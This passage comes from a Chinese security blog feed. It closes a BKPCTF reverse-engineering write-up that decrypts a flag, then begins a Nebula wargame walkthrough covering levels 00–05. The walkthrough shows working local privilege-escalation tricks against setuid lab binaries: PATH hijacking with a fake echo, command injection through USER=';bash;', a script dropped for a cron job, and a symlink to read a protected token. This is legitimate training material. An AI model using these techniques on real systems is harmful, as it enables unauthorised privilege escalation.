class="string">.text</span>:0000000000000C55                 <span class="keyword">add</span>     <span class="number">eax</span>, <span class="number">ecx</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C57                 <span class="keyword">cmp</span>     <span class="literal">r8d</span>, <span class="number">0C6EF3720h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C5E                 <span class="keyword">jnz</span>     short loc_C09</span><br><span class="line"><span class="string">.text</span>:0000000000000C60                 <span class="keyword">shl</span>     <span class="literal">rax</span>, <span class="number">20h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64 block = <span class="literal">rdx</span>                             <span class="comment">; uint32_t[2]</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C64                 <span class="keyword">or</span>      <span class="literal">rax</span>, block</span><br><span class="line"><span class="string">.text</span>:0000000000000C67                 <span class="keyword">mov</span>     [<span class="literal">rbx</span>+<span class="literal">rdi</span>], <span class="literal">rax</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6B                 <span class="keyword">add</span>     <span class="literal">rdi</span>, <span class="number">8</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C6F                 <span class="keyword">cmp</span>     <span class="literal">rdi</span>, <span class="number">28h</span></span><br><span class="line"><span class="string">.text</span>:0000000000000C73                 <span class="keyword">jnz</span>     short loc_BFC</span><br></pre></td></tr></table></figure></p>
<p>这个算法转换用python写是：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in xrange<span class="params">(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)</span>:</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	while flag <span class="built_in">!</span>= <span class="number">0</span>xC6EF3720:</span><br><span class="line">		arry[i] += <span class="params">(flag + key[<span class="params">(flag)</span>&amp;<span class="number">3</span>])</span>^<span class="params">(arry[i+<span class="number">1</span>] * <span class="number">16</span> ^ <span class="params">(arry[i+<span class="number">1</span>] / <span class="number">32</span>)</span> + arry[i+<span class="number">1</span>])</span></span><br><span class="line">		flag = ctypes.c_uint32<span class="params">(flag - <span class="number">0</span>x61C88647)</span>.value</span><br><span class="line">		arry[i+<span class="number">1</span>] += <span class="params">(flag + key[<span class="params">(flag / <span class="number">2048</span>)</span>&amp;<span class="number">3</span>])</span>^<span class="params">(<span class="params">(<span class="params">(arry[i] * <span class="number">16</span>)</span> ^ <span class="params">(arry[i] / <span class="number">32</span>)</span>)</span> + arry[i])</span>;</span><br></pre></td></tr></table></figure></p>
<p>最后输出的数组<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmp</span>     [<span class="literal">rsp</span>+<span class="number">13E8h</span>+matrix+<span class="number">24h</span>], <span class="number">4DE3F9FDh</span> <span class="comment">;           matrix[9] == 0x4DE3F9FD</span></span><br></pre></td></tr></table></figure></p>
<p>如果第十个数的值为0x4DE3F9FD, 则把前9个值传入下面的python脚本<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">X=[</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>],</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>],</span><br><span class="line">	[%<span class="keyword">d</span>,%<span class="keyword">d</span>,%<span class="keyword">d</span>] </span><br><span class="line">]</span><br><span class="line">Y = [</span><br><span class="line">	[383212,38297,8201833],</span><br><span class="line">	[382494 ,348234985,3492834886],</span><br><span class="line">	[3842947 ,984328,38423942839]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">n</span>=[5034563854941868,252734795015555591,55088063485350767967,</span><br><span class="line">-2770438152229037,142904135684288795,-33469734302639376803,</span><br><span class="line">-3633507310795117,195138776204250759,-34639402662163370450]</span><br><span class="line">y=[</span><br><span class="line">	[0,0,0],</span><br><span class="line">	[0,0,0],</span><br><span class="line">	[0,0,0]</span><br><span class="line">]</span><br><span class="line">A=[0,0,0,0,0,0,0,0,0]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(3):</span><br><span class="line">			y[i][j]+=X[i][k]*Y[k][j]</span><br><span class="line">c=0</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> y:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> r:</span><br><span class="line">		<span class="keyword">if</span> x!=<span class="keyword">n</span>[c]:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"dang..."</span></span><br><span class="line">			sys.<span class="keyword">exit</span>(47)</span><br><span class="line">		c=c+1</span><br><span class="line"><span class="keyword">print</span> <span class="string">":)"</span></span><br></pre></td></tr></table></figure></p>
<p>然后算出X<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X=[</span><br><span class="line">	[-<span class="number">1304886577</span>,<span class="number">722035088</span>,<span class="number">1368334760</span>],</span><br><span class="line">	[<span class="number">1473172750,41</span><span class="number">2774077</span>,-<span class="number">908901225</span>],</span><br><span class="line">	[-<span class="number">490967005</span>,<span class="number">563111828</span>,-<span class="number">952589187</span>] </span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>所以上面那个算法的输出要为:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matrix = [-<span class="number">1304886577</span>,<span class="number">722035088</span>,<span class="number">1368334760</span>,<span class="number">1473172750,41</span><span class="number">2774077</span>,-<span class="number">908901225</span>,-<span class="number">490967005</span>,<span class="number">563111828</span>,-<span class="number">952589187</span>, <span class="number">1306786301</span>]</span><br></pre></td></tr></table></figure></p>
<p>然后逆向算法最后得出脚本<br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># reserve.py</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">arry =<span class="comment">[-1304886577,722035088,1368334760, 1473172750,412774077,-908901225, -490967005,563111828,-952589187, 1306786301]</span></span><br><span class="line">key = <span class="comment">[1952540791, 1768908659, 1852794734, 1701995880]</span></span><br><span class="line">for x in range(len(arry)):</span><br><span class="line">	arry<span class="comment">[x]</span> = ctypes.c_uint32(arry<span class="comment">[x]</span>).value</span><br><span class="line"></span><br><span class="line">for i in xrange(0, 10, 2):</span><br><span class="line">	flag = 0xC6EF3720</span><br><span class="line">	while flag != 0:</span><br><span class="line">		v12 = flag + key<span class="comment">[(flag / 2048)&amp;3]</span></span><br><span class="line">		ecx4 = ((arry<span class="comment">[i]</span> * 16) ^ (arry<span class="comment">[i]</span> / 32)) + arry<span class="comment">[i]</span></span><br><span class="line">		x = v12^ecx4</span><br><span class="line">		arry<span class="comment">[i+1]</span> = arry<span class="comment">[i+1]</span> - x</span><br><span class="line">		arry<span class="comment">[i+1]</span> = ctypes.c_uint32(arry<span class="comment">[i+1]</span>).value</span><br><span class="line"></span><br><span class="line">		flag = ctypes.c_uint32(flag + 0x61C88647).value</span><br><span class="line"></span><br><span class="line">		v11 = flag + key<span class="comment">[flag&amp;3]</span></span><br><span class="line">		ecx2 = ((arry<span class="comment">[i+1]</span> * 16) ^ (arry<span class="comment">[i+1]</span> / 32)) + arry<span class="comment">[i+1]</span></span><br><span class="line">		y = v11^ecx2</span><br><span class="line">		arry<span class="comment">[i]</span> = arry<span class="comment">[i]</span> - y</span><br><span class="line">		arry<span class="comment">[i]</span> = ctypes.c_uint32(arry<span class="comment">[i]</span>).value</span><br><span class="line"></span><br><span class="line">for x in range(len(arry)):</span><br><span class="line">	arry<span class="comment">[x]</span> = ctypes.c_int32(arry<span class="comment">[x]</span>).value</span><br><span class="line">print arry</span><br></pre></td></tr></table></figure></p>
<p>这里有几个重要的地方，坑了我好久，一个是优先级的问题，比如<code>x ^ y + z</code>这个其实是 <code>x ^ (y + z)</code><br>还有一个，就是python不需要定义变量类型，而matrix十个值为uint_32, 所以python 就要通过ctypes进行转换，还有flag也需要进行转换.</p>
<p>最后得出<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1129335618</span>, <span class="number">1752909396</span>, <span class="number">544042349</span>, <span class="number">2036889439</span>, <span class="number">1684628512</span>, <span class="number">1696622880</span>, <span class="number">544105846</span>, <span class="number">1948282724</span>, <span class="number">2104715624</span>, <span class="number">1634947872</span>]</span><br></pre></td></tr></table></figure></p>
<p>这个数组就是flag<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x in arry:</span><br><span class="line">	tem_hex = hex<span class="params">(x)</span>[<span class="number">2</span>:]</span><br><span class="line">	tem_list = []</span><br><span class="line">	<span class="keyword">for</span> y in xrange<span class="params">(<span class="number">0</span>, len<span class="params">(tem_hex)</span>, <span class="number">2</span>)</span>:</span><br><span class="line">		tem_list.append<span class="params">(chr<span class="params">(int<span class="params">(tem_hex[y:y+<span class="number">2</span>], <span class="number">16</span>)</span>)</span>)</span></span><br><span class="line">	tem_list.reverse<span class="params">()</span></span><br><span class="line">	flag += <span class="string">""</span>.join<span class="params">(tem_list)</span></span><br><span class="line"></span><br><span class="line">print flag</span><br><span class="line"><span class="built_in">#</span> BKPCTF&#123;hmmm _why did i even do this&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这周末和小伙伴们一起打BKPCTF，我一个web狗，竟然撸逆向停不下来。。。撸了两个晚上。。。终于撸出来了。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="RE" scheme="http://0x48.pw/tags/RE/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Nebula Writeup]]></title>
    <link href="http://0x48.pw/2016/02/14/0x0F/"/>
    <id>http://0x48.pw/2016/02/14/0x0F/</id>
    <published>2016-02-14T02:16:46.000Z</published>
    <updated>2016-03-28T10:20:07.726Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
</blockquote>
<a id="more"></a>
<h1 id="附">附</h1><p>这游戏一开始我是直接在虚拟机中玩，后面发现自己傻的可以，虚拟机中各种不方便，不能粘贴复制之类，没有鼠标etc。</p>
<p>后面发现，特么我只要设置下虚拟机的网络，就可以用本机shell，ssh连上去啊！</p>
<h1 id="Level00">Level00</h1><p>第0题就是在告诉我们这系列的题目要怎么玩了，如何才算做出来。</p>
<p>其实就是分为两类用户，一个是levelxx和flagxx，xx就是题号，目的就是在levelxx用户的情况下，通过某些方法进入flagxx用户，然后执行getflag. 按目前的情况看，flagxx就是含漏洞的可执行文件。之后还有一些题是要求获取token，而token就是该题flag用户的密码。</p>
<p>第0题没啥技术性，就是用来告诉我们上面这些东西，<code>flag00</code> 的路径位 <code>/bin/.../flag00</code>, 直接执行就好:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level0<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/bin/</span>...<span class="variable">$ </span>./flag0<span class="number">0</span></span><br><span class="line"><span class="constant">Congrats,</span> now run getflag to get your flag!</span><br><span class="line"></span><br><span class="line">flag0<span class="number">0</span><span class="variable">@nebula</span><span class="symbol">:/bin/</span>...<span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level01">Level01</h1><p>第一题就感觉学到很多了，这题给了程序的源码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag01.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">gid_t</span> gid;</span><br><span class="line">    <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">    gid = getegid();</span><br><span class="line">    uid = geteuid();</span><br><span class="line"></span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/usr/bin/env echo and now what?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序位于 <code>/home/flag01/flag01</code>, 我认为该题的关键点在于文件的s权限，</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ chmod <span class="number">4750</span> fla<span class="keyword">g01</span></span><br><span class="line">$ ll</span><br><span class="line">-rwsr-x--- fla<span class="keyword">g01</span> level<span class="number">01</span>       fla<span class="keyword">g01</span></span><br></pre></td></tr></table></figure>
<p>uid, gid现在还不是了解的很清楚，以后再研究。</p>
<p>在没有设置s权限的情况下，运行flag01的uid和gid都为运行该程序用户的id，(可在/etc/passwd中查看)，但当设置了s权限之后，uid则变为该文件所属用户的uid，也就是说，任意用户(有权限)运行该文件，uid都为flag01的uid。</p>
<p>这有啥意义呢？ 该游戏的目的是使用levelxx用户通过flagxx程序get flagxx用户shell，运行getflag，该程序最后使用了system函数运行系统命令，因为设置了s权限，所以是以该文件所有者的身份运行命令，所以有两个思路，一个是直接运行getflag，另一个是运行<code>/bin/bash</code> get flag01用户的shell，这里我们用第二种方法。</p>
<p><code>$ /usr/bin/env echo</code> 是从左往右搜索 $PATH环境变量中的路径，寻找echo命令，则我们可以在环境变量的最左边添加一个路径，里面有一个我们自己写的echo命令:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span><span class="constant">PATH=</span>/<span class="symbol">tmp:</span><span class="variable">$PATH</span></span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>vim /tmp/echo</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="symbol">:wq</span></span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x /tmp/echo</span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>cd /home/flag01</span><br><span class="line">level01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>./flag01</span><br><span class="line">flag01<span class="variable">@neula</span><span class="symbol">:~</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level02">Level02</h1><p>这题一样，源码审计：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag02.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buffer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">gid_t</span> gid;</span><br><span class="line">    <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">    gid = getegid();</span><br><span class="line">    uid = geteuid();</span><br><span class="line"></span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">    buffer = NULL;</span><br><span class="line">    </span><br><span class="line">    asprintf($buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</span><br><span class="line">    </span><br><span class="line">    system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行该程序试试<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>./flag02</span><br><span class="line">about to call system(<span class="string">"/bin/echo level02 is cool"</span>)</span><br><span class="line">level02 is cool</span><br></pre></td></tr></table></figure></p>
<p>这题很简单，主要在 <code>getenv(&quot;USER&quot;)</code> 函数，该函数是获得shell的变量$USER<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="variable">$USER</span></span><br><span class="line">level02</span><br></pre></td></tr></table></figure></p>
<p>所以只要更改该值，以达到我们能get flag02用户shell的目的<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span><span class="constant">USER=</span><span class="string">";bash;"</span></span><br><span class="line">level02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>./flag02</span><br><span class="line">about to call system(<span class="string">"/bin/echo ;bash; is cool"</span>)</span><br><span class="line"></span><br><span class="line">flag02<span class="variable">@nebula</span><span class="symbol">:/home/flag02</span><span class="variable">$ </span>getflag</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<h1 id="Level03">Level03</h1><p>这题有个定时脚本，每隔几分钟运行一个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/sh</span><br><span class="line"></span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></span><br><span class="line">    (<span class="built_in">ulimit</span> -t <span class="number">5</span>; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</span><br><span class="line">    rm <span class="operator">-f</span> <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>这是一个 flag03用户运行的定时脚本，运行writable.d中的文件，运行结束后删除，不是很清楚这题的意义所在，/home/flag03/writable.d文件夹可写，那就写个脚本呗：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03/writable.d$ vim getflag.sh</span><br><span class="line"><span class="shebang">#!/bin/bash</span></span><br><span class="line">getflag &gt; a.out</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure></p>
<p>等会，你就会发现getflag.sh文件不见了，/home/flag03 下多出了a.out文件<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level03<span class="variable">@nebula</span><span class="symbol">:/home/flag03</span><span class="variable">$ </span>cat a.out</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>恕我才疏学浅，这题并不懂该如何getshell，不过感觉这样和getshell没啥区别，想运行啥直接写脚本里就好了</p>
<h1 id="Level04">Level04</h1><p>源码审计：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag04.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;unistd.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;fcntl.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> fd, rc;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)  &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>((argv[<span class="number">1</span>], <span class="string">"token"</span>) != NULL) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == -<span class="number">1</span>) &#123;</span><br><span class="line">        err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (rc == -<span class="number">1</span>) &#123;</span><br><span class="line">        err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这题的目的是读取/home/flag04/token文件，可是该文件对level04用户没有可读权限，然后通过flag04程序的限制读取token文件，flag04的源码如上。这里我陷入了一个误区了，以为对token文件啥权限都没有，所以注意里都放在代码上了，后面看了lightless的writeup才知道，没有权限的情况下仍然可以进行软链接。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level04<span class="variable">@nebula</span><span class="symbol">:~</span><span class="variable">$ </span>ln -s /home/flag04/token /tmp/fff</span><br><span class="line">level04<span class="variable">@nebula</span><span class="symbol">:/home/flag04</span><span class="variable">$ </span>./flag04 /tmp/fff</span><br><span class="line"><span class="number">0650</span>8b5e-<span class="number">8909</span>-<span class="number">4</span>f38-b63<span class="number">0</span>-fdb148a848a2</span><br></pre></td></tr></table></figure></p>
<h1 id="Level05">Level05</h1><p>这题很简单，在 <code>/home/flag05</code> 目录下多出了 <code>.backup</code> 和 <code>.ssh</code> 目录，<code>.ssh</code> 目录没有可读权限，<code>.backup</code>里有个压缩文件，copy到自己的目录下解压。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/flag05/</span>.backup<span class="variable">$ </span>cp backup-<span class="number">19072011</span>.tgz /home/level05</span><br><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/flag05/</span>.backup<span class="variable">$ </span>cd /home/level05</span><br><span class="line">level05<span class="variable">@nebula</span><span class="symbol">:/home/level05</span><span class="variable">$ </span>tar zvxf backup-<span class="number">19072011</span>.tgz</span><br></pre></td></tr></table></figure></p>
<p>解压出来了三个文件</p>
<ul>
<li>authorized_keys</li>
<li>id_rsa</li>
